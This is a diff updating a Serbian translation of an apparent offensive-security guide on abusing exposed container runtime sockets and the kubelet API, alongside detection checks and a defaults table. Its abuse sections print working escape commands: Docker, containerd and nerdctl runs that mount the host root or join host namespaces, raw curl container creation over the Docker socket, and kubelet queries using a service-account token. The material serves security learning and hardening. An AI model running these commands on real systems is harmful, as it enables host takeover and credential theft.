@@ -1,20 +1,20 @@
-# Runtime API i izloženost daemona
+# Izlaganje Runtime API-ja i Daemon-a
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Mnogi stvarni kompromisi container-a uopšte ne počinju namespace escape-om. Počinju pristupom runtime control plane-u. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman, ili kubelet preko mountovanog Unix socketa ili izloženog TCP listener-a, napadač može da zatraži novi container sa većim privilegijama, mount-uje host filesystem, priključi se host namespaces ili dohvati osetljive informacije o nodu. U tim slučajevima runtime API je prava granica sigurnosti, i kompromitovanje iste je funkcionalno blisko kompromitovanju host-a.
+Mnogi stvarni kompromisi kontejnera uopšte ne počinju sa namespace escape. Počinju sa pristupom control plane-u runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman, ili kubelet preko mountovanog Unix socket-a ili izloženog TCP listener-a, napadač može da zatraži novi kontejner sa boljim privilegijama, mount-uje host filesystem, pridruži se host namespace-ovima, ili pribavi osetljive informacije o node-u. U tim slučajevima, runtime API je stvarna security boundary, i kompromitovanje njega je funkcionalno blizu kompromitovanja host-a.
 
-Zbog toga izloženost runtime socketa treba dokumentovati odvojeno od kernel protections. Container sa uobičajenim seccomp, capabilities i MAC confinement može i dalje biti udaljen samo jedan API poziv od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` mountovan unutar njega. Kernel izolacija trenutnog containera može raditi tačno kako je dizajnirano, dok runtime management plane ostaje potpuno izložen.
+Zbog toga izlaganje runtime socket-a treba dokumentovati odvojeno od kernel zaštita. Kontejner sa običnim seccomp, capabilities, i MAC confinement i dalje može biti samo jedan API poziv udaljen od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` mountovan unutar njega. Kernel izolacija trenutnog kontejnera može raditi tačno kako je predviđeno, dok runtime management plane ostaje potpuno izložen.
 
-## Modeli pristupa daemona
+## Modeli pristupa Daemon-u
 
-Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socketa na `unix:///var/run/docker.sock`. Istorijski je takođe bio izložen i remotelno preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-zaštićenog listener-a na `2376`. Izlaganje daemona remotelno bez jakog TLS-a i klijentske autentifikacije efektivno pretvara Docker API u remote root interfejs.
+Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socket-a na `unix:///var/run/docker.sock`. Istorijski je takođe bio izlagan udaljeno preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-zaštićenog listener-a na `2376`. Izlaganje daemon-a udaljeno bez jakog TLS i client authentication efektivno pretvara Docker API u remote root interfejs.
 
-`containerd`, CRI-O, Podman i kubelet izlažu slične površine visokog uticaja. Imena i workflows se razlikuju, ali logika ostaje ista. Ako interfejs omogućava pozivaocu da kreira workloads, mount-uje host puteve, dobije credentials ili menja pokrenute containere, interfejs je privilegovani management kanal i treba ga tretirati u skladu s tim.
+containerd, CRI-O, Podman, i kubelet izlažu slične površine visokog uticaja. Imena i workflow se razlikuju, ali logika ne. Ako interfejs omogućava pozivaocu da kreira workloads, mountuje host path-ove, pribavi credentials, ili menja pokrenute kontejnere, interfejs je privilegovani management channel i treba ga tako tretirati.
 
-Uobičajeni lokalni putevi koje vredi proveriti su:
+Uobičajene lokalne putanje koje vredi proveriti su:
 ```text
 /var/run/docker.sock
 /run/docker.sock
@@ -25,81 +25,147 @@ Uobičajeni lokalni putevi koje vredi proveriti su:
 /run/buildkit/buildkitd.sock
 /run/firecracker-containerd.sock
 ```
-Stariji ili specijalizovaniji sistemi mogu takođe izložiti krajnje tačke poput `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. One su ređe u savremenim okruženjima, ali kada se pojave treba ih tretirati sa istom opreznošću jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione sokete.
+Stariji ili specijalizovaniji stack-ovi mogu takođe izlagati endpoint-e kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Oni su ređi u modernim okruženjima, ali kada se naiđe na njih, treba ih tretirati sa istim oprezom zato što predstavljaju runtime-control površine, a ne obične application socket-e.
 
-## Siguran daljinski pristup
+## Secure Remote Access
 
-Ako daemon mora biti izložen izvan lokalnog soketa, konekcija bi trebalo da bude zaštićena TLS-om i po mogućstvu uz međusobnu autentifikaciju, tako da daemon verifikuje klijenta, a klijent verifikuje daemon. Stari običaj da se Docker daemon otvara preko običnog HTTP-a radi pogodnosti je jedna od najopasnijih grešaka u administraciji kontejnera, jer je API površina dovoljno moćna da direktno kreira privilegovane kontejnere.
+Ako daemon mora da bude izložen van lokalnog socket-a, konekcija treba da bude zaštićena sa TLS i po mogućstvu sa mutual authentication, tako da daemon proverava client-a, a client proverava daemon. Stara navika otvaranja Docker daemon-a na plain HTTP radi praktičnosti jedna je od najopasnijih grešaka u container administration jer API surface je dovoljno snažan da direktno kreira privileged containers.
 
-Istorijski obrazac konfiguracije Dockera je izgledao ovako:
+Istorijski Docker configuration pattern je izgledao ovako:
 ```bash
 DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
 sudo service docker restart
 ```
-Na systemd-based hostovima, daemon komunikacija može se takođe pojaviti kao `fd://`, što znači da proces nasleđuje unapred otvoren socket od systemd umesto da ga sam direktno veže. Bitna lekcija nije tačan sintaksis, već sigurnosna posledica. U trenutku kada daemon sluša dalje od strogo permissioned lokalnog socketa, transport security i client authentication postaju obavezne umesto opcionalnog hardeninga.
+Na hostovima zasnovanim na systemd, komunikacija sa daemon-om može se takođe pojaviti kao `fd://`, što znači da proces nasleđuje prethodno otvoren socket od systemd umesto da ga direktno sam bind-uje. Važna lekcija nije tačna sintaksa već bezbednosna posledica. Onog trenutka kada daemon sluša izvan strogo dozvoljenog lokalnog socket-a, transport security i client authentication postaju obavezni, a ne opcioni hardening.
 
-## Zloupotreba
+## Abuse
 
-Ako runtime socket postoji, potvrdite koji je u pitanju, da li postoji kompatibilan client, i da li je moguć raw HTTP ili gRPC pristup:
+Ako je runtime socket prisutan, potvrdi koji je to, da li postoji kompatibilan client i da li je moguć raw HTTP ili gRPC pristup:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
 ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
 docker -H unix:///var/run/docker.sock version 2>/dev/null
+podman --url unix:///run/podman/podman.sock info 2>/dev/null
+nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
+crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
 crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
+buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
 ```
-Ove komande su korisne zato što prave razliku između dead path-a, montiranog ali nedostupnog socket-a i live privileged API-ja. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.
+Ove komande su korisne jer razlikuju mrtvu putanju, montiran ali nedostupan socket, i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount ili deljenjem host namespace.
 
-### Kompletan primer: Docker Socket To Host Root
+### When No Client Is Installed
 
-Ako `docker.sock` može da se dosegne, klasični escape je da se pokrene novi container koji montira host root filesystem i zatim `chroot`-uje u njega:
+Odsustvo `docker`, `podman`, ili nekog drugog prijateljskog CLI ne znači da je socket bezbedan. Docker Engine govori HTTP preko svog Unix socket-a, a Podman izlaže i Docker-compatible API i Libpod-native API kroz `podman system service`. To znači da minimalno okruženje sa samo `curl` i dalje može biti dovoljno da pokreće daemon:
+```bash
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
+curl --unix-socket /var/run/docker.sock \
+-H 'Content-Type: application/json' \
+-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
+-X POST http://localhost/v1.54/containers/create
+
+curl --unix-socket /run/podman/podman.sock http://d/_ping
+curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
+```
+Ovo je važno tokom post-exploitation jer defanzivci ponekad uklone uobičajene client binaries, ali ostave management socket mountovan. Na Podman hostovima, zapamtite da se high-value path razlikuje između rootful i rootless deployments: `unix:///run/podman/podman.sock` za rootful service instances i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless one.
+
+### Full Example: Docker Socket To Host Root
+
+Ako je `docker.sock` dostupan, klasičan escape je da se pokrene novi container koji mountuje host root filesystem i zatim `chroot` u njega:
 ```bash
 docker -H unix:///var/run/docker.sock images
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
 ```
-Ovo obezbeđuje direktno host-root izvršavanje preko Docker daemon-a. Uticaj nije ograničen samo na čitanje fajlova. Jednom unutar novog container-a, napadač može menjati host fajlove, prikupljati kredencijale, implantirati persistence ili pokrenuti dodatne privilegovane workloads.
+Ovo omogućava direktno izvršavanje kao host-root preko Docker daemona. Uticaj nije ograničen na čitanje fajlova. Jednom unutra u novom containeru, napadač može da menja host fajlove, prikuplja credentials, implantira persistence, ili pokreće dodatne privileged workloads.
 
 ### Full Example: Docker Socket To Host Namespaces
 
-Ako napadač preferira ulazak u namespace umesto pristupa samo filesystem-u:
+Ako napadač više voli ulazak u namespace umesto pristupa samo fajlovima:
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
-Ovaj put dostiže host tako što se od runtime-a traži da kreira novi container sa eksplicitnim izlaganjem host-namespace umesto iskorišćavanja trenutnog.
+Ova putanja dostiže host tako što traži od runtime-a da kreira novi container sa eksplicitnim izlaganjem host-namespace, umesto da iskorišćava postojeći.
 
-### Potpun primer: containerd Socket
+### Full Example: containerd Socket
 
-Montiran `containerd` socket je obično podjednako opasan:
+Montirani `containerd` socket je obično jednako opasan:
 ```bash
 ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
 ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
 chroot /host /bin/sh
 ```
-Uticaj je ponovo kompromitacija hosta. Čak i ako Docker-specific tooling nije prisutan, neki drugi runtime API može i dalje ponuditi istu administrativnu moć.
+Ako je prisutan klijent više nalik Docker-u, `nerdctl` može biti pogodniji od `ctr` zato što izlaže poznate flagove kao što su `--privileged`, `--pid=host` i `-v`:
+```bash
+nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
+--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
+chroot /host /bin/sh
+```
+Uticaj je opet kompromitacija hosta. Čak i ako Docker-specific tooling nedostaje, drugi runtime API i dalje može da pruži istu administratorsku moć. Na Kubernetes čvorovima, `crictl` takođe može biti dovoljan za reconnaissance i interakciju sa containerima jer direktno govori CRI endpoint-u.
 
-## Provere
+### BuildKit Socket
 
-Cilj ovih provera je da odgovore na pitanje da li kontejner može da dosegne bilo koju upravljačku ravninu koja je trebalo da ostane izvan granica poverenja.
+`buildkitd` je lako prevideti jer ga ljudi često smatraju samo "build backend-om", ali daemon je i dalje privileged control plane. Dostupan `buildkitd.sock` može napadaču da omogući da pokrene proizvoljne build korake, pregleda worker capabilities, koristi local contexts iz kompromitovanog okruženja i zatraži dangerous entitlements kao što su `network.host` ili `security.insecure` kada je daemon bio konfigurisan da ih dozvoli.
+
+Korisne prve interakcije su:
+```bash
+buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
+buildctl --addr unix:///run/buildkit/buildkitd.sock du
+```
+Ako daemon prihvata build zahteve, testirajte da li su dostupni insecure entitlements:
+```bash
+buildctl --addr unix:///run/buildkit/buildkitd.sock build \
+--frontend dockerfile.v0 \
+--local context=. \
+--local dockerfile=. \
+--allow network.host \
+--allow security.insecure \
+--output type=local,dest=/tmp/buildkit-out
+```
+Tačan uticaj zavisi od konfiguracije daemon-a, ali rootful BuildKit servis sa permissive entitlements nije bezazlena developerska pogodnost. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, posebno na CI runnerima i shared build node-ovima.
+
+### Kubelet API Over TCP
+
+kubelet nije container runtime, ali je i dalje deo node management plane-a i često spada u istu diskusiju o trust boundary. Ako je kubelet secure port `10250` dostupan iz workload-a, ili ako su node credentials, kubeconfigs, ili proxy rights izloženi, napadač možda može da enumeriše Pods, preuzme logs, ili izvrši komande u node-local container-ima bez ikakvog dodirivanja Kubernetes API server admission path-a.
+
+Počnite sa jeftinim discovery:
+```bash
+curl -sk https://127.0.0.1:10250/pods
+curl -sk https://127.0.0.1:10250/runningpods/
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
+```
+Ako kubelet ili API-server proxy path autorizuje `exec`, klijent sa podrškom za WebSocket može to da pretvori u izvršavanje koda u drugim containerima na node-u. Ovo je takođe razlog zašto je `nodes/proxy` sa samo `get` permission opasnije nego što zvuči: request i dalje može da stigne do kubelet endpoints koji izvršavaju komande, a te direktne kubelet interakcije se ne pojavljuju u normalnim Kubernetes audit logs.
+
+## Checks
+
+Cilj ovih checks je da odgovore da li container može da dosegne bilo koji management plane koji je trebalo da ostane izvan trust boundary.
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
 mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
 ss -lntp 2>/dev/null | grep -E ':2375|:2376'
-env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
+env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
+find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
 ```
-Šta je ovde zanimljivo:
+Šta je zanimljivo ovde:
 
-- Montirani runtime socket obično predstavlja direktan administrativni primitiv, a ne puko otkrivanje informacija.
-- TCP listener na `2375` bez TLS treba tretirati kao uslov za udaljenu kompromitaciju.
-- Promenljive okruženja poput `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.
+- Montiran runtime socket je obično direktna administrativna primitiva, a ne puko otkrivanje informacija.
+- TCP listener na `2375` bez TLS treba tretirati kao uslov za remote-compromise.
+- Environment variables kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.
 
-## Podrazumevana podešavanja runtime-a
+## Runtime Defaults
 
-| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
+| Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | Podrazumevani lokalni Unix socket | `dockerd` osluškuje lokalni socket i daemon je obično pokrenut kao root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
-| Podman | Podrazumevano CLI bez daemona | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i mogu biti izloženi kada je omogućen `podman system service` | exposing `podman.sock`, running the service broadly, rootful API use |
-| containerd | Lokalni privilegovani socket | Administrativni API izložen preko lokalnog socketa i obično korišćen od strane alata višeg nivoa | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
-| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen za lokalne, pouzdane komponente na čvoru | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
-| Kubernetes kubelet | API za upravljanje lokalno na čvoru | Kubelet ne bi trebalo da bude široko dostupan iz Pods; pristup može otkriti stanje pod-a, kredencijale i mogućnosti izvršavanja u zavisnosti od authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
+| Docker Engine | Local Unix socket by default | `dockerd` sluša na lokalnom socketu i daemon je obično rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
+| Podman | Daemonless CLI by default | Za običnu lokalnu upotrebu nije potreban dugotrajan privileged daemon; API sockets i dalje mogu biti exposed kada je `podman system service` enabled | exposing `podman.sock`, running the service broadly, rootful API use |
+| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
+| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
+| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko reachable iz Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
+
+## References
+
+- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
+- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
 {{#include ../../../banners/hacktricks-training.md}}
